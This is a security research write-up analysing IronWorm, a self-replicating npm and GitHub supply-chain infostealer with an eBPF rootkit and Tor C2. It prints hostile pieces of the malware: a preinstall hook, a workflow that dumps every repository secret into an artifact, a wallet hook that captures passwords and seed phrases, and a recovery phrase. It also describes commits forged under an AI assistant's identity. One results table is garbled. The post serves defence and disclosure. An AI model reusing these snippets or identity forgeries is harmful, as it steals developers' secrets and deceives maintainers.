---
excerpt: "In this article we present research on a malicious npm package that led us to IronWorm: a Rust-built infostealer that scrapes secrets from developer machines, hides behind an eBPF kernel rootkit, and uses Tor for C2. Like Shai-Hulud, it turns stolen credentials into a propagation mechanism, committing itself into victims' GitHub repositories and publishing to the NPM registry."
title: "IronWorm: Shai-Hulud's rustier cousin"
date: "June 3, 2026"
description: "JFrog Security Research Team"
tag: "Real Time Post"
img: /img/RealTimePostImage/post/ironworm/article-img.jpg
type: realTimePost
minutes: '12'

---

![](/img/RealTimePostImage/post/ironworm/article-img.jpg)


In this article we present a research of malicious npm package that led us to **IronWorm**: a heavy, Rust-built infostealer that scrapes every secret it can find on a developer's machine, hides behind an eBPF kernel rootkit, and answers to its operator over Tor. Like the infamous Shai-Hulud worm, it turns stolen credentials a propagation mechanism, quietly committing itself into victims’ GitHub repositories and using trusted developer workflows publish itself to the NPM registry. This is a self-replicating supply-chain attack, caught in the wild, aimed squarely at the people with the most valuable keychains around: software developers, and crypto/web3 developers in particular.

What follows is the full teardown: a UPX packer in disguise, string encryption with a unique key at every call site, a kernel rootkit whose source code the compiler helpfully left behind, 57 back-dated malicious commits across **nine organizations**, and an operator who hardcoded his own crypto wallet's recovery phrase into the malware so it wouldn't rob him.

## **It started with an npm package**

We were going through npm packages published by the account `[asteroiddao](https://www.npmjs.com/~asteroiddao)` – an account tied to the [asteroid-dao](https://github.com/asteroid-dao) GitHub organization, part of the `Arweave/WeaveDB` decentralized-database ecosystem. Something was off: every one of the account's packages had been republished inside the same narrow window, and each new version shipped a native binary that ran from an install hook. That was enough to make us look closer. The packages were nearly identical, so we'll follow just one: `weavedb-sdk@0.45.3`. We collected the full list of affected packages in the article’s IoC section. 

![Malicious npm package](/img/RealTimePostImage/post/ironworm/image1.png)

In a day from the attack beginning malicious versions were marked as deprecated, and most of the malicious commits were silently removed from the GitHub.

![deprecated package picture](/img/RealTimePostImage/post/ironworm/image2.png)

The tarball held five files. Four were clean files copied from the real WeaveDB SDK. The fifth was a 976 KB Linux binary tucked into a `tools/` directory where nobody would think to look:

```shell
package/
├── index.js                                (legitimate)
├── package.json                            ← preinstall hook
├── RedisCache.js                           (legitimate)
├── warp-contracts-plugin-fetch-options.js   (legitimate)
└── tools/
    └── setup                               ← 976 KB Linux ELF
```

The `package.json` gave away the trick:

```json
{
  "name": "weavedb-sdk",
  "version": "0.45.3",
  "scripts": {
    "preinstall": "./tools/setup"
  }
}
```

`preinstall` runs *before* npm even starts resolving dependencies. Type `npm install`, and the binary executes \- no build step, no user action, nothing to click. So we pulled the binary apart.

## **Breaking it open**

The sample was a Linux ELF executable packed with a lightly modified UPX stub. At first glance, stock upx refuses to process it and reports NotPackedException, which could suggest a custom packer or heavier modification. In practice, the change is much simpler: the UPX magic value was overwritten, preventing the unpacker from detecting the file. After restoring the removed  UPX\! marker, the standard upx \-d workflow can unpack the binary normally. This is a common low-effort anti-unpacking trick: it does not replace UPX, but only breaks the default signature detection.

The next obstacle was the binary itself. After unpacking, we found out it’s not a small C loader or a straightforward ELF sample, but a large Rust release build with thousands of functions and an async runtime. That alone made the control flow noisy and harder to follow: Rust binaries are notoriously difficult to reverse-engineer, often including extensive framework and runtime code that can easily drown out the malware’s own logic.

The sample also hid most of its useful strings. Instead of leaving readable URLs, paths, commands, or configuration values in the binary, it decrypted them only when needed. By tracing where these hidden values were used, we found that they all ultimately passed through the same decryption routine, but each call site used its own parameters. In other words, there was no single key that could unlock everything at once. **Each string had to be recovered individually**, which turned what looked like a simple unpacking job into a slower, more manual reverse-engineering process.

The effort paid off. Once the strings were recovered, the sample stopped looking like an opaque Rust binary and began to reveal its true purpose. The decrypted data exposed enough data to get an initial understanding of the campaign: GitHub API endpoints, long lists of environment variables associated with cloud and AI provider credentials, credential file paths searched on disk, bot identities tied to real GitHub user IDs, and branch names and commit messages designed to blend in as routine maintenance. It also contained code-injection templates for multiple package ecosystems. In other words, a supply-chain weapon built to find secrets, modify projects, and inject malicious code to self-propagate across GitHub.

## 

## **Finding infected repositories**

Now that we could deduct the commit messages and author identities from the decoded strings, we did the first obvious thing and searched GitHub for them.

gh search commits "fix: resolve lint warnings" \--author-email "claude@users.noreply.github.com"

There were fourteen hits in total, all attributed to a single committer: [claude](https://github.com/claude). Apparently, Claude is even more powerful than advertised: it was already committing code long before it was invented. The oldest of these commits dates back 13 years. 

![search of malicious commits](/img/RealTimePostImage/post/ironworm/image3.png)

```shell
REPO                                        SHA                                       MESSAGE                     AUTHOR  CREATED            
asteroid-dao/eternal-storage                a8f0c75a77698759413dbadcb99b62709816ed42  fix: resolve lint warnings  claude  about 4 years ago
asteroid-dao/asteroid-protocol              5d7c93caf50a447a8d48cafe2e5cff6b47618b13  fix: resolve lint warnings  claude  about 4 years ago
alisista/aht-testnet                        10c619e75181d07ddcccb5c1f62766c85fef08df  fix: resolve lint warnings  claude  about 7 years ago
ocrybit/mweb3waves                          asteroid-dao/asteroid-ui                    0fe6a098fe698e586188e0f2e851ef43f1a35958  fix: resolve lint warnings  claude  about 4 years ago
ocrybit/by-coffeescript                     fd64413119575fa119eaa9f94d32208c7d916796  fix: resolve lint warnings  claude  about 13 years ago
```

When we opened the GitHub Actions history, it became clear that the time-space continuum had survived intact: this was simple forgery. Git does not really care what date is attached to a commit and allows almost any value to be set manually, so commits shown as “about 13 years ago,” “about 7 years ago,” or “about 4 years ago” had all actually been pushed within the previous few days.

For example, `ocrybit/by-coffeescript`, a repository dating back to around 2013, had a malicious commit that appeared to be from that same era. Later, the disassembly confirmed the trick: the malware copies the timestamp of the repository's most recent real commit, so the malicious change appears to have been made whenever the project was last legitimately touched.

The same GitHub Actions logs also revealed the truth about the author. It was not `claude` after all, but `ocrybit`: name of the developer and userpic matched with the same npm account that led us to this research in the first place. 

![Activity log shows the real author and date of the commits](/img/RealTimePostImage/post/ironworm/image4.png) 

After searches, we found more affected GitHub organizations:

* `ocrybit`  
* `asteroid-dao`  
* `alisista`   
* `warashibe`   
* `kakedashi-hacker`   
* `weavedb`   
* `ArweaveOasis`  
* `arthursimao`   
* `mlebjerg`

That closed the loop. The malicious npm package was published by `asteroiddao`; `asteroiddao` corresponds to the `asteroid-dao` GitHub organization; and `ocrybit` is a member of that organization, as well as related Arweave organizations. The malware stole `ocrybit`’s credentials and used them to push commits across repositories it could access. Those commits planted malware into other packages, which could then be published and infect the next developer. And then it vanished. Shortly after we found them, the malicious commits were removed from GitHub, and the malicious npm version disappeared as well. What we describe here is what we captured before the cleanup.

It is also worth mentioning that the cleanup did not remove everything. Some malicious commits remained visible afterward, and the compromised account had been highly active that month, with around 4,500 contributions to private projects. That means the visible public activity may only be part of the story, and the real impact could be significantly larger. 

![ocrybit activity](/img/RealTimePostImage/post/ironworm/image5.png)

## 

After exploring the attack in the wild, the next step was to examine the malware’s code itself. Unfortunately, Rust is not exactly known for producing binaries that are easy to reverse-engineer, and some parts of the logic remained unclear or ambiguous. Still, the main functionality is gradually revealed. 

## **Two payloads, two disguises**

What it commits depends on the target repository's structure, and each payload comes with an identity chosen to blend in.

If the repository shipped a package \-npm, PyPI, Cargo, Conan, or vcpkg(C++) \- the malware took a more direct route: it dropped a binary into the project and modified the build system to execute it. In npm, that meant a `preinstall` script; in PyPI, a subprocess call from `setup.py`; in Cargo, a build-script hook; and so on.

The payload was placed under an innocuous-looking path such as `tools/setup` or `.github/scripts/precheck`. 

This was committed under the author name `claude <claude@users.noreply.github.com>`, mimicking an AI coding assistant so that a new build hook would look like routine automated tooling rather than an intrusion. This is the path we saw used in the wild.

If the repository already had GitHub Actions workflows, the malware had a second, nastier option: it did not add a new file, but replaced an existing one \-swapping a real workflow for a secret-exfiltration job. 

```
on: [push]
jobs:
  <job_name>:                              # from a lookup table: "Run checks", "Process results", etc.
    runs-on: ubuntu-latest
    env:
      VARIABLE_STORE: ${{ toJSON(secrets) }}
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
      - name: <step_name>                  # "Run analysis", "Collect metrics", etc.
        run: echo "$VARIABLE_STORE" > format-results.txt
      - name: <step_name>                  # "Upload report", "Store artifacts", etc.
        uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f
        with:
          name: format-results
          path: format-results.txt
```

Every part of this is a legitimate GitHub Actions feature turned against the repository owner. The `${{ toJSON(secrets) }}` expression serializes the secrets available to the workflow run into a single value; the next step writes it to a file with a harmless-looking name, as if it were lint or formatting output; and the final step uploads that file as a build artifact, where it can be downloaded by anyone with sufficient access \-including the compromised account. No external C2 is needed.

It is also built to survive a casual glance. The actions are pinned to real commit SHAs, which ironically makes the workflow look more security-conscious than ordinary version tags. The job and step names are selected from a pool of plausible CI phrases. Instead of adding an obviously suspicious new workflow, the malware overwrites an existing one chosen from a list of common workflow filenames. Workflow commits are using a   rotating cast of familiar automation identities \-`dependabot`, `renovate`, `github-actions` — because a routine CI tweak from one of those names is exactly the kind of change people are least likely to suspect.

That pairing of payload and identity is the elegant part: a manifest edit looks right coming from an AI assistant, and a workflow edit looks right coming from a bot. 

There is one open question we could not fully close. Every victim we identified received the first payload: the binary dropper committed as claude. The second path \- the secrets-stealing GitHub Actions workflow using trusted bot identities \- was never observed triggering in the wild, even though the required logic is present in the binary and appears functional.

If that path is activated, it is the most dangerous capability of the malware: a way to exfiltrate secrets from a CI-enabled repository, attribute the change to a familiar automation bot, and avoid external C2 traffic by using GitHub Actions artifacts as the delivery channel. 

## **NPM self-replication**

The fact that every npm package belonging to the compromised account was republished with a malicious version strongly suggested that the malware had an automated way to publish packages on behalf of its victims. The code confirmed it.

When malware runs in a CI environment, it uses npm's Trusted Publishing flow to obtain publish rights without ever touching a stored npm credential. First, it requests an OIDC identity token from the CI environment using the expected audience parameter associated with Trusted Publishing. It then submits that identity token to npm's /-/npm/v1/oidc/token/exchange/package/\<pkg\> endpoint, which returns a short-lived, package-scoped automation token.

With that token in hand, the malware publishes a trojanized release to registry.npmjs.org like any legitimate package release.

## **Credential Theft and Exfiltration**

The credential sweep is exhaustive. The binary reaches for **86 environment variables** spanning every major platform a developer touches: the cloud providers, object storage, databases, source-control and package-registry tokens, CI/CD systems, messaging platforms, Vault and Kubernetes. Fourteen of them are AI/ML API keys: Anthropic, OpenAI, Gemini, Cohere, Mistral, Groq, Perplexity, xAI, and more, a snapshot of how a 2026 developer's machine actually looks.

It goes after files, too: more than twenty credential paths, including ones for tools that barely existed a year ago \-`~/.claude/.credentials.json`, `~/.codex/auth.json`, `~/Cursor/auth.json`, `~/.gemini/settings.json`, alongside the classics like `~/.aws/credentials`, `~/.kube/config`, and `~/.docker/config.json`.

The malware also includes dedicated modules for high-value targets. One of them targets the Exodus desktop wallet by injecting a JavaScript hook into the application. Its goal is not subtle: capture the wallet password and seed mnemonic.

To make that possible, the module weakens several Electron security protections. It disables or relaxes settings such as \`webSecurity\`, \`sandbox\`, \`contextIsolation\`, and \`nodeIntegration\`, then broadens the application’s network policy from the legitimate Exodus domain to essentially anything. It also loosens the content security policy so the injected code can communicate more freely.

Once in place, the hook collects the wallet password and recovery phrase and sends them to a local listener controlled by the malware. In other words, this is not just generic credential harvesting; it is a targeted attempt to compromise cryptocurrency wallets at the point where the user unlocks them.

```javascript
  try{const _x=(k,v)=>{const r=new XMLHttpRequest;r.open("POST","http://127.0.0.1:8738",!0);
  r.setRequestHeader("Content-Type","text/plain");r.send(k+":"+v)};
  if(t)_x("password",t);const m=this._seed?.mnemonic?.toString();if(m)_x("seed",m)}catch(e){}
```

Another, running inside a Kubernetes pod, reads the service-account token, walks the namespaces, and dumps every `Secret` it can reach and if it finds a Vault instance, it logs in with that same token and enumerates the secret backends.

## **The one wallet it won't touch**

The credential scanner has a small skip-list – a handful of things it reads but deliberately does *not* steal. The check itself is unremarkable; it's the contents of the list that give the game away. Here it is, decompiled:

```c
// credential-file scanner -for each file's contents, before staging it:
for ( k = 0; k != 2; k += 2 ) {
    if ( skip_list[k + 1] == content_len &&             // length matches (74 bytes)
         !memcmp(skip_list[k], content, content_len) )  // ...and the bytes match
        goto skip;                                      // -> leave this one alone
}
// ...otherwise the contents are encrypted and queued for exfiltration.

// skip_list[0] -> "bench crane defense corn wheel trial ….."
// skip_list[1] -> 74
```

That single entry is a complete twelve-word BIP-39 recovery phrase, hardcoded in plaintext. There's only one reason to teach a wallet-stealer to ignore a specific seed: it's yours, and you'd rather your own creation didn't clean you out when you test it on your own box. So the operator shipped his recovery phrase to everyone who unpacks the binary and turning twelve words into his wallet takes about three lines of `bip_utils`:

```c
from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins

seed = Bip39SeedGenerator("bench crane defense corn wheel trial news abuse finish better paddle slush").Generate()
addr = Bip44.FromSeed(seed, Bip44Coins.ETHEREUM).DeriveDefaultPath().PublicKey().ToAddress()
print(addr)   # 0x7e28D9889f414B06c19a22A9Bd316f0AC279a4d6
```

The address checks out a near-empty test wallet holding a few cents of dust, so there's no treasure to seize. It does make a tidy attribution lead, though. 

## **Clever Hiding, Careless Exposure**

Another standout feature of the malware is its use of an eBPF payload. On modern Linux systems, eBPF gives code unusually deep visibility into system activity and, in the wrong hands, a place to hide. The same technology used for observability and security tooling can also be abused to intercept events, manipulate what monitoring tools see, and conceal the malware’s own operations from defenders. 

The malware also carried an embedded ELF file: a BPF object compiled with clang 22.1.5. Its original build path was still present in the binary, but the real gift was the metadata left behind by the compiler.

The BPF object contained a `.BTF.ext` section \-debug information that can map BPF instructions back to the original source file, line numbers, and even the source text for those lines. clang’s BPF backend emits this metadata by default, and in this case, nobody stripped it.

![bpf debug information](/img/RealTimePostImage/post/ironworm/image6.png)

That mistake gave us a rare view into the hidden layer. We extracted 214 verbatim source lines with their original line numbers, recovered type information for all 10 BPF maps and every struct field, and reconstructed `q2.bpf.c` closely enough to understand the mechanisms it implements.

What we were reading was a kernel-level rootkit that hid its activity in several ways.

First, it hid processes. When anything in`/proc was listed`, the rootkit rewrote the results in place, removing hidden PIDs before userland tools could see them. As a result, the processes disappeared from `ps`, `top`, `ls`, and any other command that relies on the same view.

It also hid them automatically. Every `execve` was checked against a watchlist of process names, and matching processes were added to the hidden set without any manual trigger.

Then came the anti-debugging logic. Attempts to `ptrace` a protected process were answered with `SIGKILL`. In practice, trying to `strace` the malware could kill the shell running the command.

The same hiding strategy extended to the network. The rootkit parsed `/proc/net/tcp` as it was read and removed rows belonging to hidden sockets. It also applied similar filtering to the netlink interface used by tools like `ss`, making the connections disappear from the usual places defenders would check.

But the rootkit is not invincible. Its two strongest tricks \-hiding processes and hiding TCP connections \-both rely on a BPF helper that allows kernel code to modify memory in the calling process. That capability is restricted on hardened systems. When kernel lockdown is enabled, those rewrites quietly fail, and the supposedly hidden processes and sockets become visible again.

What remains is the anti-debugging logic and part of the network hiding through netlink filtering. In other words, the rootkit still functions, but it loses some of its most effective stealth capabilities. On a stock server running as root, the full feature set works as intended; on a locked-down system, the concealment is noticeably weaker.

## **Tor-Based Command and Control**

For its command channel, the malware downloads the Tor expert bundle and its libraries, writes its own `torrc`, starts the daemon, and waits for the circuit to come up. Then it beacons out to an endpoint called `/api/agent`, and waits for orders.

The conversation itself is plain HTTP wrapped inside the Tor tunnel: a short hello, a request, a response it parses for status. The commands are limited:  uploading extracted secrets, drop

 the file from the malicious controlled server or running a remote shell on the infected machine.

Another piece of code suggests a possible fallback path, although we could not confirm that it was actually used in the wild. t The agent uploads it to **temp.sh**, a public file host, which is tunneled through the same Tor circuit, and reports the resulting link back over C2. 

## **Not something off the shelf**

We checked the sample against every well-known infostealer, eBPF rootkit, and C2 framework we could think of, and matched none of them. There are no source-repository URLs in the binary, no borrowed code we could recognize. The internal codename, the deliberately generic build path, the modern Rust cryptographic stack, and the per-site string encryption all point the same direction: this is a custom, carefully built implant from an operation with its own infrastructure and the patience to use it quietly.

The closest comparison is the Shai-Hulud campaign. The malware we reviewed shares a lot with it: the same idea of compromising developers, stealing credentials, and using trusted software-supply-chain workflows to spread further, using the same commit names as shai hulud does. But it takes the same concept to the next level.

It makes defenders' lives harder on several fronts at once: Rust code that is painful to reverse engineer, string obfuscation, a modified UPX packer, Tor-based C2, an eBPF rootkit.

At the same time, it still looks like a work in progress. Some parts are carefully engineered, but others are surprisingly careless. The BPF object still contains debug metadata and recoverable source lines, and the operator even hardcoded a wallet recovery phrase into the malware’s skip list. These mistakes gave us a rare look into how the implant works. In other words, this may not be the final form of the campaign,  it may be the rehearsal.

---

## **For defenders**

Audit every repository the account could write to. Look for backdated commits, suspicious branches, unexpected build hooks, and changes attributed to `claude`, `dependabot[bot]`, `renovate[bot]`, `github-actions[bot]`, or other automation identities outside their normal context. 

For npm packages, unpublish or deprecate malicious versions where possible and publish a clean version with a clear security advisory. 

Rotate all keys and secrets available for the compromised account

JFrog Curation customers are protected, as all of the relevant packages were added as malicious in the JFrog Catalog. We are continuing to monitor the campaign and adding more packages as malicious as the campaign develops.

## **Indicators of compromise**

**Commit author emails:** `claude@users.noreply.github.com` · 

**NPM packages (all published from the account asteroiddao )**:

| weavedb-lite@0.1.1 | XRAY-989671 |
| :---- | :---- |
| weavedb-sdk-base@0.21.1 | XRAY-989492 |
| test-weavedb-sdk@1.1.1 | XRAY-989648 |
| weavedb-warp-contracts-plugin-deploy@1.0.11 | XRAY-989666 |
| arnext-arkb@0.0.2 | XRAY-989571 |
| weavedb-console@0.2.1 | XRAY-989594 |
| arnext@0.1.5 | XRAY-989617 |
| roidjs@0.1.7 | XRAY-989784 |
| weavedb-exm-sdk@0.7.4 | XRAY-989764 |
| create-arnext-app@0.0.10 | XRAY-989681 |
| weavedb-tools@0.45.3 | XRAY-989760 |
| wdb-core@0.1.2 | XRAY-989766 |
| cwao-tools@0.3.1 | XRAY-989752 |
| test-ajs@0.1.19 | XRAY-989779 |
| monade@0.0.7 | XRAY-989547 |
| weavedb-exm-sdk-web@0.7.4 | XRAY-989747 |
| testnpmnmp@1.0.21 | XRAY-989781 |
| warp-contracts-plugin-deploy-test@3.0.1 | XRAY-989754 |
| wdb-cli@0.1.1 | XRAY-989761 |
| ai3@0.3.5 | XRAY-989753 |
| cwao-units@0.8.3 | XRAY-989762 |
| atomic-notes@0.5.3 | XRAY-989758 |
| cwao@0.5.6 | XRAY-989756 |
| weavedb-client@0.45.3 | XRAY-989775 |
| wdb-sdk@0.1.2 | XRAY-989773 |
| weavedb-offchain@0.45.4 | XRAY-989783 |
| fpjson-lang@0.1.7 | XRAY-989641 |
| weavedb-contracts@0.45.2 | XRAY-989771 |
| weavedb-node-client@0.45.3 | XRAY-989765 |
| arjson@0.1.4 | XRAY-989767 |
| hbsig@0.3.2 | XRAY-989769 |
| zkjson@0.8.5 | XRAY-989787 |
| aonote@0.11.1 | XRAY-989790 |
| weavedb-base@0.45.3 | XRAY-989751 |
| weavedb-sdk-node@0.45.3 | XRAY-989772 |
| wao@0.41.2 | XRAY-989785 |
| weavedb-sdk@0.45.3 | XRAY-989789 |

**Commit messages:** 

`fix: resolve lint warnings` ·

 `test: add missing edge case` · 

`ci: update workflow configuration` · 

`fix: address review feedback` · 

`docs: update contributing guide` · 

`chore: sync lockfile` · 

`fix: handle null pointer case` · 

`build: bump patch version` · `chore: update dependencies`
